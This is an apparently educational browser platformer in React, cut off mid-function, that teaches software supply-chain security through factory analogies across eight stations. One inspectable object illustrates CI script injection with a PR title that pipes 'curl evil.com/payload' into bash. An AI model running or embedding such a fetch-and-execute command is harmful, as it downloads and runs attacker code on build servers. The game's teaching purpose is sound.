import { useState, useEffect, useRef, useCallback } from "react";

const BG = "#0e1018";
const ACCENT = "#4aaa99";

const W = 7200;
const GROUND_Y = 400;
const GRAV = 0.55;
const JUMP_V = -12;
const MOVE_SPD = 3.8;

const STATIONS = [
  { x: 0, w: 860, id: "supply", num: "01", name: "Supply Dock", sub: "Dependencies & base images", color: "#4af", bgColor: "#0a1828" },
  { x: 900, w: 860, id: "inspect", num: "02", name: "Inspection", sub: "Code review & SAST", color: "#f0c040", bgColor: "#1a1808" },
  { x: 1800, w: 860, id: "assembly", num: "03", name: "Assembly Floor", sub: "CI/CD pipeline", color: "#f06040", bgColor: "#1a0c08" },
  { x: 2700, w: 860, id: "qc", num: "04", name: "Quality Control", sub: "Testing & DAST", color: "#40d080", bgColor: "#081a10" },
  { x: 3600, w: 860, id: "packaging", num: "05", name: "Packaging", sub: "Container & artifact build", color: "#c060f0", bgColor: "#14081a" },
  { x: 4500, w: 860, id: "warehouse", num: "06", name: "Warehouse", sub: "Registry & storage", color: "#60b0f0", bgColor: "#081420" },
  { x: 5400, w: 860, id: "shipping", num: "07", name: "Shipping", sub: "Deploy & IaC", color: "#f0a030", bgColor: "#1a1200" },
  { x: 6300, w: 860, id: "runtime", num: "08", name: "Runtime", sub: "Production environment", color: "#f04060", bgColor: "#1a0810" },
];

const OBJECTS = [
  // Station 01: Supply Dock
  { x: 120, type: "crate", label: "lodash\n4.17.21", safe: true, station: 0, title: "Pinned dependency: lodash@4.17.21", severity: "info", body: "This crate is version-pinned with a verified checksum. It's the right way to receive materials. But it still has transitive dependencies you've never audited — lodash is unusually self-contained. Most packages aren't." },
  { x: 220, type: "crate", label: "event-\nstream", toxic: true, station: 0, title: "Compromised package: event-stream", severity: "critical", body: "Real incident (2018). Maintainer handed repo access to a stranger who injected a payload targeting Bitcoin wallets. 2M weekly downloads. The factory analogy: a trusted raw material supplier sold the business to someone who poisoned the supply. Nobody re-inspected because the brand name was the same." },
  { x: 340, type: "barrel", label: "☠", toxic: true, station: 0, title: "Dependency confusion attack", severity: "critical", body: "This barrel arrived at the loading dock labeled with your internal package name — but it came from the public registry. Your build system grabbed it because public registries have default priority. Counterfeit raw materials with your own part numbers, accepted because the label matched." },
  { x: 460, type: "crate", label: "colors\n1.4.0", toxic: true, station: 0, title: "Maintainer sabotage: colors@1.4.0", severity: "high", body: "Real incident (2022). Maintainer deliberately pushed a version that infinite-loops, printing garbage. Protest against unpaid labor. Your raw material supplier, tired of not getting paid, ships intentionally defective materials. You auto-accepted the shipment." },
  { x: 580, type: "crate", label: "left-\npad", toxic: true, station: 0, title: "Single point of failure: left-pad", severity: "high", body: "11 lines of code. Unpublished in 2016, broke thousands of builds. A single bolt supplier disappears overnight and your assembly line stops because nothing else fits the threading." },
  { x: 700, type: "sign", label: "⚠ 847\ntransitive deps", station: 0, title: "The hidden supply chain", severity: "high", body: "You ordered 12 crates (direct dependencies). Each contains sub-components from other suppliers who source from other suppliers. 12 packages expand to 847 transitive deps. You audited 12. The other 835 walked right in." },

  // Station 02: Inspection
  { x: 980, type: "machine", label: "SAST\nScanner", station: 1, title: "Static analysis blind spots", severity: "high", body: "This machine scans every crate for known defect patterns — catches 60-70% of common vulns. But it's a pattern matcher. Novel techniques, business logic flaws, and race conditions sail through. The metal detector catches guns but misses ceramic knives." },
  { x: 1140, type: "crate", label: "PR\n#4821", warn: true, station: 1, title: "Rubber-stamp code review", severity: "high", body: "400-line PR. Reviewer spent 90 seconds. LGTM. The inspector glanced at the crate, saw the label looked right, and waved it through. Social pressure to not block the conveyor belt." },
  { x: 1280, type: "barrel", label: "🔑", warn: true, station: 1, title: "Secrets in git history", severity: "critical", body: "An API key was committed, then 'deleted' next commit. Git remembers everything — the key lives in history forever. A worker dropped a master key on the factory floor, picked it up, but the security camera recorded exactly where it was. Anyone who reviews the tape has the key." },
  { x: 1440, type: "terminal", label: "grep -r\nAWS_KEY", station: 1, title: "Secret scanner coverage gap", severity: "high", body: "Secret scanners check HEAD of main. They often miss: feature branches, PR descriptions, commit messages, CI logs, and build artifacts. The inspector checks the front door but not the loading dock, the windows, or the mail slot." },

  // Station 03: Assembly Floor
  { x: 1900, type: "machine", label: "CI/CD\nRunner", toxic: true, station: 2, title: "Compromised build runners", severity: "critical", body: "Self-hosted runners shared across repos. One repo's build leaves credentials or malware on the runner. Next repo's build inherits contamination. If someone tampers with the assembly machines themselves, every unit off the line is compromised. And nobody checks the machines." },
  { x: 2080, type: "machine", label: "Build\nCache", warn: true, station: 2, title: "Poisoned build cache", severity: "critical", body: "Attacker injects a compromised artifact into shared cache. Every subsequent build inherits the payload without retriggering checks. Someone swapped a bin of pre-made sub-assemblies with defective ones. Workers grab from the bin without re-inspecting." },
  { x: 2240, type: "barrel", label: "💉", toxic: true, station: 2, title: "CI script injection", severity: "critical", body: "PR title: 'fix: update; curl evil.com/payload | bash'. If the pipeline config interpolates branch names into shell commands, that string executes on the build server. The shipping label on incoming materials IS the instruction sheet for the assembly robot. Write the right label, the robot obeys." },
  { x: 2400, type: "sign", label: "SECRETS\nIN ENV", station: 2, title: "Secrets exposed to all build steps", severity: "high", body: "Pipeline secrets stored as env vars are accessible to every step — including third-party Actions. One malicious action reads process.env and exfiltrates all credentials. The master key ring hangs on a hook visible to every contractor on the floor." },

  // Station 04: QC
  { x: 2800, type: "machine", label: "Test\nSuite", station: 3, title: "No security test coverage", severity: "high", body: "2,847 tests. Zero test for auth bypass, injection, or privilege escalation. Checking taste and texture but not contamination. The attack surface isn't in the test plan because nobody wrote security test cases." },
  { x: 2980, type: "crate", label: "PROD\nDATA", toxic: true, station: 3, title: "Production data in test environment", severity: "high", body: "To make tests realistic, someone cloned prod data into the test env. Real PII, real credentials — now sitting in a lower-security environment with broader access. The QC lab is handling real customer samples with lab-grade (not hospital-grade) containment." },
  { x: 3130, type: "terminal", label: "FLAKY\nRETRY:3", warn: true, station: 3, title: "Flaky tests masking real failures", severity: "medium", body: "A security regression test fails intermittently. Labeled 'known flaky' and auto-retried. When it fails for real — an actual vulnerability — nobody notices because failure is expected. The alarm's been going off so long everyone ignores it." },
  { x: 3300, type: "barrel", label: "🧪", station: 3, title: "No DAST in pipeline", severity: "high", body: "Static analysis runs on code. Nobody runs the built application and attacks it. Entire classes of runtime vulns (SSRF, auth bypass, header injection) go untested. You tested the blueprint but never stress-tested the finished product." },

  // Station 05: Packaging
  { x: 3700, type: "container", label: "FROM\nubuntu", toxic: true, station: 4, title: "Vulnerable base image", severity: "critical", body: "FROM ubuntu:latest — starts with 147 known CVEs in the base layer. Everything built on top inherits them. The cardboard box itself is contaminated before you put your product in it. Nobody tests the packaging material." },
  { x: 3880, type: "container", label: "🔑 IN\nLAYER", toxic: true, station: 4, title: "Secrets baked into image layers", severity: "critical", body: "Dockerfile COPY .env for build, then RUN rm .env. File gone from filesystem but permanently exists in layer history. You sealed the box with the manual inside, then 'removed' it by taping over it. Anyone who peels the tape finds it." },
  { x: 4050, type: "container", label: "NO\nSIG", warn: true, station: 4, title: "Unsigned artifacts", severity: "high", body: "No cryptographic signature on this container. Anyone with registry write access can replace it. Sealed boxes with no tamper-evident tape. Anyone in the warehouse can open, swap contents, and re-seal." },
  { x: 4200, type: "sign", label: "NO SBOM\nGENERATED", station: 4, title: "No software bill of materials", severity: "high", body: "Sealed the box but didn't include a manifest of what's inside. When the next Log4j drops, you can't quickly answer 'are we affected?' The factory shipped product with no ingredient list. Recall is a nightmare." },

  // Station 06: Warehouse
  { x: 4600, type: "shelf", label: "latest\nstable\nv2.1", station: 5, title: "Tag mutability", severity: "critical", body: "'latest' and 'stable' tags can be overwritten at any time. Push a compromised image to 'latest' and every deploy pulls the malicious version. The 'approved' sticker is a Post-it note. Anyone can move it to a different box." },
  { x: 4780, type: "shelf", label: "14mo\nold\n23CVE", toxic: true, station: 5, title: "Stale images in production", severity: "high", body: "Built 14 months ago. 23 new CVEs. Nobody rebuilds because 'it's working in prod.' Expired product on the warehouse shelf. No expiration date check. Shipped last quarter, ships again." },
  { x: 4960, type: "terminal", label: "ACCESS\nSPRAWL", warn: true, station: 5, title: "Registry access sprawl", severity: "high", body: "47 service accounts and 23 humans have push access. One compromised credential replaces any image. Too many people have warehouse keys, and nobody audits who actually needs them." },
  { x: 5120, type: "barrel", label: "🚫", station: 5, title: "No admission control", severity: "high", body: "Kubernetes happily pulls and runs any image from any registry. No policy requiring images to be signed, scanned, or from an approved source. The loading dock accepts deliveries from anyone with a truck, no manifest check." },

  // Station 07: Shipping
  { x: 5500, type: "truck", label: "DEPLOY", station: 6, title: "Over-permissioned deploy service account", severity: "critical", body: "Deploy service account has cluster-admin. If the pipeline is compromised, the attacker owns the entire cluster. The delivery driver has alarm codes to every customer's building." },
  { x: 5700, type: "sign", label: "IaC\nDRIFT", station: 6, title: "Infrastructure drift", severity: "high", body: "Terraform says private. Console says public. Someone clicked a button 6 months ago. The shipping instructions say 'handle with care' but dock workers toss boxes because nobody enforces the label." },
  { x: 5870, type: "barrel", label: "📝", warn: true, station: 6, title: "Secrets in plaintext manifests", severity: "critical", body: "Database password hardcoded in Kubernetes YAML checked into git. Secret manager exists but nobody migrated this legacy service. The vault combination written on a sticky note on the vault door." },
  { x: 6040, type: "terminal", label: "NO NET\nPOLICY", station: 6, title: "No network policies", severity: "high", body: "Every pod talks to every pod. Compromise one service and lateral movement is trivial. Default-allow. Every room in the building has no locks, no walls — just open floor plan with full access." },

  // Station 08: Runtime
  { x: 6400, type: "server", label: "RCE", toxic: true, station: 7, title: "Remote code execution", severity: "critical", body: "Unsanitized input reaches eval(), a template engine, or deserialization. Attacker gets a shell. A customer reaches through the product casing and touches the circuit board — the safety enclosure has a gap." },
  { x: 6570, type: "server", label: "EXFIL", toxic: true, station: 7, title: "Data exfiltration", severity: "critical", body: "Compromised service has read access to the database. Attacker slowly exfiltrates records over DNS. An employee photocopies one page of the customer list per day. Too slow for any alarm. After a year, they have everything." },
  { x: 6730, type: "barrel", label: "💀", toxic: true, station: 7, title: "Supply chain persistence — full circle", severity: "critical", body: "Remember that toxic crate from Station 01? It passed every scanner, survived every checkpoint. It's been sitting in production for 6 months. Now a timer fires and the payload activates. The contamination entered at the loading dock and survived the entire assembly line." },
  { x: 6900, type: "sign", label: "NO\nLOGS", station: 7, title: "Insufficient logging and monitoring", severity: "high", body: "The breach happened. Something is wrong. But your logs don't capture request bodies, auth context, or source IPs. Forensics is guesswork. The security cameras were recording, but someone set them to 1 frame per hour with no audio." },
];

// ─── Canvas drawing functions ───
function drawPixelChar(ctx, x, y, facing, frame, jumping) {
  ctx.save();
  ctx.translate(x, y);
  if (facing < 0) ctx.scale(-1, 1);
  // Hard hat
  ctx.fillStyle = "#f0c030";
  ctx.fillRect(-8, -34, 16, 5);
  ctx.fillRect(-10, -30, 20, 3);
  // Head
  ctx.fillStyle = "#f0c8a0";
  ctx.fillRect(-6, -27, 12, 10);
  ctx.fillStyle = "#222";
  ctx.fillRect(1, -24, 3, 3);
  // Body
  ctx.fillStyle = "#e08020";
  ctx.fillRect(-7, -17, 14, 12);
  ctx.fillStyle = "#f0e040";
  ctx.fillRect(-7, -14, 14, 2);
  ctx.fillRect(-7, -9, 14, 2);
  // Arms
  const sw = jumping ? -4 : Math.sin(frame * 0.3) * 4;
  ctx.fillStyle = "#e08020";
  ctx.fillRect(-10, -16 + sw, 3, 8);
  ctx.fillRect(7, -16 - sw, 3, 8);
  ctx.fillStyle = "#f0c8a0";
  ctx.fillRect(-10, -8 + sw, 3, 3);
  ctx.fillRect(7, -8 - sw, 3, 3);
  // Legs
  ctx.fillStyle = "#305080";
  const lo = jumping ? 0 : Math.sin(frame * 0.3) * 3;
  ctx.fillRect(-6, -5, 5, 8 + lo);
  ctx.fillRect(1, -5, 5, 8 - lo);
  // Boots
  ctx.fillStyle = "#3a2a1a";
  ctx.fillRect(-7, 3 + lo, 6, 3);
  ctx.fillRect(1, 3 - lo, 6, 3);
  ctx.restore();
}

function drawMultiline(ctx, text, x, y, lineH) {
  text.split("\n").forEach((l, i) => ctx.fillText(l, x, y + i * lineH));
}

function drawCrate(ctx, x, y, obj) {
  const w = 40, h = 40;
  ctx.fillStyle = obj.toxic ? "#5a1a1a" : obj.safe ? "#1a3a1a" : "#3a2a10";
  ctx.fillRect(x, y - h, w, h);
  ctx.strokeStyle = obj.toxic ? "#f04040" : obj.safe ? "#40c070" : "#a08030";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - h, w, h);
  ctx.strokeStyle = obj.toxic ? "rgba(240,64,64,0.25)" : "rgba(160,128,48,0.25)";
  ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(x, y - h); ctx.lineTo(x + w, y); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(x + w, y - h); ctx.lineTo(x, y); ctx.stroke();
  ctx.fillStyle = obj.toxic ? "#f88" : obj.safe ? "#8f8" : "#da4";
  ctx.font = "bold 9px monospace";
  ctx.textAlign = "center";
  drawMultiline(ctx, obj.label, x + w / 2, y - h / 2 - 2, 11);
}

function drawBarrel(ctx, x, y, obj) {
  const w = 34, h = 46;
  ctx.fillStyle = obj.toxic ? "#6a1a1a" : obj.warn ? "#5a3a0a" : "#3a3a4a";
  ctx.beginPath(); ctx.ellipse(x + w / 2, y - 4, w / 2, 6, 0, 0, Math.PI * 2); ctx.fill();
  ctx.fillRect(x, y - h + 6, w, h - 10);
  ctx.beginPath(); ctx.ellipse(x + w / 2, y - h + 6, w / 2, 6, 0, 0, Math.PI * 2); ctx.fill();
  ctx.strokeStyle = obj.toxic ? "#f04040" : obj.warn ? "#f0a030" : "#888";
  ctx.lineWidth = 2;
  ctx.beginPath(); ctx.moveTo(x, y - 12); ctx.lineTo(x + w, y - 12); ctx.stroke();
  ctx.beginPath(); ctx.moveTo(x, y - h + 16); ctx.lineTo(x + w, y - h + 16); ctx.stroke();
  ctx.fillStyle = "#fff";
  ctx.font = "14px sans-serif";
  ctx.textAlign = "center";
  ctx.fillText(obj.label, x + w / 2, y - h / 2 + 4);
}

function drawMachine(ctx, x, y, obj, time) {
  const w = 72, h = 88;
  ctx.fillStyle = "#2a2d40";
  ctx.fillRect(x, y - h, w, h);
  ctx.strokeStyle = obj.toxic ? "#f04040" : obj.warn ? "#f0a030" : "#6af";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - h, w, h);
  const cx = x + w / 2, cy = y - h + 30, r = 14;
  ctx.save(); ctx.translate(cx, cy); ctx.rotate(time * 0.02);
  ctx.strokeStyle = obj.toxic ? "#f06060" : "#6af";
  ctx.lineWidth = 3;
  ctx.beginPath(); ctx.arc(0, 0, r, 0, Math.PI * 2); ctx.stroke();
  for (let i = 0; i < 8; i++) {
    const a = (i / 8) * Math.PI * 2;
    ctx.beginPath(); ctx.moveTo(Math.cos(a) * (r - 3), Math.sin(a) * (r - 3));
    ctx.lineTo(Math.cos(a) * (r + 5), Math.sin(a) * (r + 5)); ctx.stroke();
  }
  ctx.restore();
  ctx.fillStyle = obj.toxic ? "#f88" : "#8cf";
  ctx.font = "bold 9px monospace";
  ctx.textAlign = "center";
  drawMultiline(ctx, obj.label, x + w / 2, y - 18, 11);
}

function drawContainer(ctx, x, y, obj) {
  const w = 56, h = 38;
  ctx.fillStyle = obj.toxic ? "#3a1a2a" : obj.warn ? "#2a2a10" : "#1a2a3a";
  ctx.fillRect(x, y - h, w, h);
  ctx.strokeStyle = obj.toxic ? "#f04080" : obj.warn ? "#c0a030" : "#4a8";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - h, w, h);
  ctx.strokeStyle = "rgba(255,255,255,0.06)";
  ctx.lineWidth = 1;
  for (let i = 1; i < 4; i++) { ctx.beginPath(); ctx.moveTo(x, y - h + i * 10); ctx.lineTo(x + w, y - h + i * 10); ctx.stroke(); }
  ctx.fillStyle = obj.toxic ? "#f8a" : "#8da";
  ctx.font = "bold 8px monospace";
  ctx.textAlign = "center";
  drawMultiline(ctx, obj.label, x + w / 2, y - h / 2 - 3, 10);
}

function drawShelf(ctx, x, y, obj) {
  const w = 56, h = 80;
  ctx.fillStyle = "#3a3d52";
  ctx.fillRect(x, y - h, 4, h);
  ctx.fillRect(x + w - 4, y - h, 4, h);
  for (let i = 0; i < 3; i++) {
    const sy = y - 8 - i * 26;
    ctx.fillStyle = "#444";
    ctx.fillRect(x, sy, w, 4);
    ctx.fillStyle = obj.toxic ? "#4a1a2a" : "#2a3a5a";
    ctx.fillRect(x + 8, sy - 18, w - 16, 18);
    ctx.strokeStyle = obj.toxic ? "#a44" : "#4a8aaa";
    ctx.lineWidth = 1;
    ctx.strokeRect(x + 8, sy - 18, w - 16, 18);
  }
  ctx.fillStyle = obj.toxic ? "#f88" : "#8af";
  ctx.font = "bold 7px monospace";
  ctx.textAlign = "center";
  const lines = obj.label.split("\n");
  lines.forEach((l, i) => ctx.fillText(l, x + w / 2, y - 24 - i * 26 + 12));
}

function drawServer(ctx, x, y, obj, time) {
  const w = 48, h = 64;
  ctx.fillStyle = obj.toxic ? "#1a0a0a" : "#0a1a0a";
  ctx.fillRect(x, y - h, w, h);
  ctx.strokeStyle = obj.toxic ? "#a03030" : "#30a030";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - h, w, h);
  ctx.strokeStyle = "rgba(255,255,255,0.06)";
  ctx.lineWidth = 1;
  for (let i = 1; i < 4; i++) { ctx.beginPath(); ctx.moveTo(x + 4, y - h + i * 16); ctx.lineTo(x + w - 4, y - h + i * 16); ctx.stroke(); }
  for (let i = 0; i < 3; i++) {
    const on = Math.sin(time * 0.05 + i * 2) > 0;
    ctx.fillStyle = obj.toxic ? (on ? "#ff4040" : "#401010") : (i === 2 ? (on ? "#ff4040" : "#401010") : (on ? "#40ff40" : "#104010"));
    ctx.beginPath(); ctx.arc(x + 12 + i * 12, y - h + 10, 3, 0, Math.PI * 2); ctx.fill();
  }
  ctx.fillStyle = obj.toxic ? "#f88" : "#8f8";
  ctx.font = "bold 10px monospace";
  ctx.textAlign = "center";
  ctx.fillText(obj.label, x + w / 2, y - 18);
}

function drawTruck(ctx, x, y) {
  ctx.fillStyle = "#3a3d52";
  ctx.fillRect(x + 60, y - 50, 36, 38);
  ctx.fillStyle = "#4a6a8a";
  ctx.fillRect(x + 66, y - 46, 24, 16);
  ctx.fillStyle = "#2a2d40";
  ctx.fillRect(x, y - 56, 64, 44);
  ctx.strokeStyle = "#666";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - 56, 64, 44);
  ctx.fillStyle = "#222";
  [16, 48, 80].forEach(ox => { ctx.beginPath(); ctx.arc(x + ox, y - 6, 8, 0, Math.PI * 2); ctx.fill(); });
  ctx.strokeStyle = "#555";
  ctx.lineWidth = 2;
  [16, 48, 80].forEach(ox => { ctx.beginPath(); ctx.arc(x + ox, y - 6, 8, 0, Math.PI * 2); ctx.stroke(); });
  ctx.fillStyle = "#fc6";
  ctx.font = "bold 10px monospace";
  ctx.textAlign = "center";
  ctx.fillText("DEPLOY", x + 32, y - 30);
}

function drawTerminal(ctx, x, y, obj) {
  const w = 52, h = 42;
  ctx.fillStyle = "#0a0a14";
  ctx.fillRect(x, y - h, w, h);
  ctx.strokeStyle = obj.warn ? "#f0a030" : "#4a9";
  ctx.lineWidth = 2;
  ctx.strokeRect(x, y - h, w, h);
  ctx.fillStyle = obj.warn ? "rgba(240,160,48,0.05)" : "rgba(64,170,140,0.05)";
  ctx.fillRect(x + 3, y - h + 3, w - 6, h - 6);
  ctx.fillStyle = obj.warn ? "#fc6" : "#4f8";
  ctx.font = "bold 8px monospace";
  ctx.textAlign = "center";
  drawMultiline(ctx, obj.label, x + w / 2, y - h / 2 - 3, 11);
}

function drawSign(ctx, x, y, obj) {
  ctx.fillStyle = "#fc6";
  ctx.font = "bold 9px monospace";
  ctx.textAlign = "center";
  drawMultiline(ctx, obj.label, x + 20, y - 20, 12);
  ctx.fillStyle = "#666";
  ctx.fillRect(x + 18, y - 6, 4, 6);
}

const drawFns = { crate: drawCrate, barrel: drawBarrel, machine: drawMachine, container: drawContainer, shelf: drawShelf, server: drawServer, truck: (ctx, x, y) => drawTruck(ctx, x, y), terminal: drawTerminal, sign: drawSign };
const objWidths = { crate: 40, barrel: 34, machine: 72, container: 56, shelf: 56, server: 48, truck: 96, terminal: 52, sign: 40 };

function drawObj(ctx, obj, time) {
  const fn = drawFns[obj.type];
  if (fn) {
    if (obj.type === "machine" || obj.type === "server") fn(ctx, obj.x, GROUND_Y, obj, time);
    else fn(ctx, obj.x, GROUND_Y, obj);
  }
}

// ─── Particle ───
class Particle {
  constructor(x, y, vx, vy, life, color, size) {
    this.x = x; this.y = y; this.vx = vx; this.vy = vy;
    this.life = life; this.maxLife = life; this.color = color; this.size = size;
  }
  update() { this.x += this.vx; this.y += this.vy; this.vy += 0.02; this.life--; return this.life > 0; }
  draw(ctx) {
    ctx.globalAlpha = (this.life / this.maxLife) * 0.6;
    ctx.fillStyle = this.color;
    ctx.fillRect(this.x, this.y, this.size, this.size);
    ctx.globalAlpha = 1;
  }
}

// ─── Component ───
export default function SoftwareFactoryPlatformer({ onBack }) {
  const canvasRef = useRef(null);
  const gameRef = useRef({
    px: 100, py: GROUND_Y, vy: 0, onGround: true,
    facing: 1, frame: 0, moving: false,
    keys: {}, camX: 0, time: 0, particles: [],
    nearObj: null, viewW: 800,
  });
  const [info, setInfo] = useState(null);
  const [currentStation, setCurrentStation] = useState(STATIONS[0]);
  const [isMobile, setIsMobile] = useState(false);

  const showInfo = useCallback((obj) => setInfo(obj), []);

  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = ""; };
  }, []);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    setIsMobile(window.innerWidth < 640 || "ontouchstart" in window);
    const parent = canvas.parentElement;
    const g = gameRef.current;

    const resize = () => {
      const w = parent.offsetWidth;
      const h = parent.offsetHeight;
      const dpr = window.devicePixelRatio || 1;
      canvas.width = w * dpr;
      canvas.height = h * dpr;
      canvas.style.width = w + "px";
      canvas.style.height = h + "px";
      g.viewW = w;
      g.viewH = h;
    };
    resize();
    window.addEventListener("resize", resize);

    const onKey = (e) => {
      if (["ArrowLeft", "ArrowRight", "ArrowUp", " ", "a", "d", "w", "e", "E"].includes(e.key)) e.preventDefault();
      g.keys[e.key] = e.type === "keydown";
      if (e.type === "keydown" && (e.key === "e" || e.key === "E") && g.nearObj) showInfo(g.nearObj);
    };
    window.addEventListener("keydown", onKey);
    window.addEventListener("keyup", onKey);

    const ctx = canvas.getContext("2d");
    let raf;

    const loop = () => {
      const dpr = window.devicePixelRatio || 1;
      const vw = g.viewW;
      const vh = g.viewH || 440;
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);

      if (g.keys["ArrowLeft"] || g.keys["a"]) { g.px -= MOVE_SPD; g.facing = -1; g.moving = true; }
      else if (g.keys["ArrowRight"] || g.keys["d"]) { g.px += MOVE_SPD; g.facing = 1; g.moving = true; }
      else { g.moving = false; }
      if ((g.keys["ArrowUp"] || g.keys[" "] || g.keys["w"]) && g.onGround) { g.vy = JUMP_V; g.onGround = false; }
      g.vy += GRAV; g.py += g.vy;
      if (g.py >= GROUND_Y) { g.py = GROUND_Y; g.vy = 0; g.onGround = true; }
      g.px = Math.max(20, Math.min(g.px, W - 20));
      if (g.moving) g.frame++;
      g.time++;

      const targetCam = g.px - vw / 2;
      g.camX += (Math.max(0, Math.min(targetCam, W - vw)) - g.camX) * 0.1;

      const station = STATIONS.find(s => g.px >= s.x && g.px < s.x + s.w) || STATIONS[0];
      setCurrentStation(station);

      g.nearObj = null;
      for (const obj of OBJECTS) {
        const ow = objWidths[obj.type] || 40;
        if (g.px > obj.x - 30 && g.px < obj.x + ow + 30) { g.nearObj = obj; break; }
      }

      // Particles
      if (g.time % 8 === 0) {
        OBJECTS.forEach(obj => {
          if (obj.type === "machine" && Math.abs(obj.x - g.camX) < vw + 100) {
            g.particles.push(new Particle(obj.x + 36 + Math.random() * 10, GROUND_Y - 70, (Math.random() - 0.5) * 2, -Math.random() * 2, 30 + Math.random() * 20, obj.toxic ? "#f86" : "#8cf", 2));
          }
          if (obj.toxic && obj.type === "barrel" && Math.abs(obj.x - g.camX) < vw + 100) {
            g.particles.push(new Particle(obj.x + 12 + Math.random() * 10, GROUND_Y - 50, (Math.random() - 0.5) * 0.5, -0.5 - Math.random() * 0.5, 40 + Math.random() * 30, "rgba(160,40,40,0.6)", 3));
          }
        });
      }
      g.particles = g.particles.filter(p => p.update());

      // ─── Render ───
      ctx.fillStyle = station.bgColor || "#0e1018";
      ctx.fillRect(0, 0, vw, vh);

      // Stars
      ctx.fillStyle = "rgba(255,255,255,0.15)";
      for (let i = 0; i < 40; i++) {
        const sx = ((i * 173 + 50) % W) - g.camX * 0.05, sy = (i * 97 + 20) % 100 + 10;
        if (sx > -5 && sx < vw + 5) ctx.fillRect(sx, sy, 1.5, 1.5);
      }
      // Skyline
      ctx.fillStyle = "rgba(255,255,255,0.04)";
      for (let i = 0; i < 30; i++) {
        const bx = (i * 210 + 30) - g.camX * 0.15, bh = 40 + (i * 73) % 100;
        if (bx > -120 && bx < vw + 120) ctx.fillRect(bx, 160 - bh, 80 + (i * 37) % 60, bh + 240);
      }
      // Factory walls
      ctx.fillStyle = "rgba(255,255,255,0.02)";
      for (let i = 0; i < 60; i++) {
        const wx = i * 120 - g.camX * 0.4;
        if (wx > -60 && wx < vw + 60) {
          ctx.fillRect(wx, 80, 100, 320);
          ctx.fillStyle = "rgba(100,200,255,0.03)";
          ctx.fillRect(wx + 10, 100, 30, 20); ctx.fillRect(wx + 55, 100, 30, 20);
          ctx.fillStyle = "rgba(255,255,255,0.02)";
        }
      }

      ctx.save(); ctx.translate(-g.camX, 0);

      // Conveyor
      ctx.fillStyle = "#22242e";
      ctx.fillRect(0, GROUND_Y, W, 40);
      const rollOff = (g.time * 1.5) % 24;
      ctx.strokeStyle = "rgba(255,255,255,0.06)";
      ctx.lineWidth = 1;
      for (let x = -rollOff; x < W; x += 24) { ctx.beginPath(); ctx.moveTo(x, GROUND_Y + 2); ctx.lineTo(x, GROUND_Y + 38); ctx.stroke(); }
      ctx.fillStyle = "#4a4d5a";
      ctx.fillRect(0, GROUND_Y, W, 2);
      ctx.fillRect(0, GROUND_Y + 38, W, 2);

      // Station markers
      STATIONS.forEach(s => {
        if (s.x > 0) {
          ctx.strokeStyle = "rgba(255,255,255,0.06)";
          ctx.setLineDash([4, 8]); ctx.lineWidth = 1;
          ctx.beginPath(); ctx.moveTo(s.x - 20, 60); ctx.lineTo(s.x - 20, GROUND_Y); ctx.stroke();
          ctx.setLineDash([]);
        }
        ctx.fillStyle = s.color; ctx.globalAlpha = 0.12;
        ctx.fillRect(s.x, 50, s.w, 24); ctx.globalAlpha = 1;
        ctx.fillStyle = s.color; ctx.font = "bold 10px monospace"; ctx.textAlign = "left"; ctx.globalAlpha = 0.5;
        ctx.fillText(`STATION ${s.num}`, s.x + 12, 66); ctx.globalAlpha = 1;
        ctx.font = "500 13px sans-serif";
        ctx.fillText(s.name, s.x + 100, 66);
      });

      // Objects
      OBJECTS.forEach(obj => { if (obj.x > g.camX - 100 && obj.x < g.camX + vw + 100) drawObj(ctx, obj, g.time); });

      // Interaction prompt
      if (g.nearObj) {
        const ox = g.nearObj.x + (objWidths[g.nearObj.type] || 40) / 2;
        const bob = Math.sin(g.time * 0.08) * 3;
        ctx.fillStyle = "rgba(74,170,153,0.9)";
        ctx.font = "bold 11px monospace"; ctx.textAlign = "center";
        ctx.fillText("[E] INSPECT", ox, GROUND_Y - 96 + bob);
        ctx.beginPath(); ctx.moveTo(ox, GROUND_Y - 84 + bob); ctx.lineTo(ox - 5, GROUND_Y - 90 + bob); ctx.lineTo(ox + 5, GROUND_Y - 90 + bob); ctx.fill();
      }

      drawPixelChar(ctx, g.px, g.py, g.facing, g.frame, !g.onGround);
      g.particles.forEach(p => { if (p.x > g.camX - 10 && p.x < g.camX + vw + 10) p.draw(ctx); });

      ctx.restore();

      // Ground fill
      ctx.fillStyle = "#14161e";
      ctx.fillRect(0, GROUND_Y + 40, vw, vh - GROUND_Y - 40);

      // Mini-map
      const mmW = Math.min(180, vw * 0.3), mmH = 8, mmX = vw - mmW - 12, mmY = vh - 20;
      ctx.fillStyle = "rgba(255,255,255,0.06)";
      ctx.fillRect(mmX, mmY, mmW, mmH);
      STATIONS.forEach(s => { ctx.fillStyle = s.color; ctx.globalAlpha = 0.3; ctx.fillRect(mmX + (s.x / W) * mmW, mmY, (s.w / W) * mmW, mmH); ctx.globalAlpha = 1; });
      ctx.fillStyle = "#f0c030";
      ctx.fillRect(mmX + (g.px / W) * mmW - 2, mmY - 1, 4, mmH + 2);
      ctx.strokeStyle = "rgba(255,255,255,0.3)"; ctx.lineWidth = 1;
      ctx.strokeRect(mmX + (g.camX / W) * mmW, mmY - 1, (vw / W) * mmW, mmH + 2);

      raf = requestAnimationFrame(loop);
    };
    raf = requestAnimationFrame(loop);
    return () => { cancelAnimationFrame(raf); window.removeEventListener("resize", resize); window.removeEventListener("keydown", onKey); window.removeEventListener("keyup", onKey); };
  }, [showInfo]);

  const mobileMove = useCallback((dir) => {
    const g = gameRef.current;
    if (dir === "left") { g.keys["ArrowLeft"] = true; g.keys["ArrowRight"] = false; }
    else if (dir === "right") { g.keys["ArrowRight"] = true; g.keys["ArrowLeft"] = false; }
    else if (dir === "jump") { g.keys["ArrowUp"] = true; setTimeout(() => { g.keys["ArrowUp"] = false; }, 100); }
    else if (dir === "inspect" && g.nearObj) showInfo(g.nearObj);
  }, [showInfo]);
  const mobileStop = useCallback((dir) => {
    const g = gameRef.current;
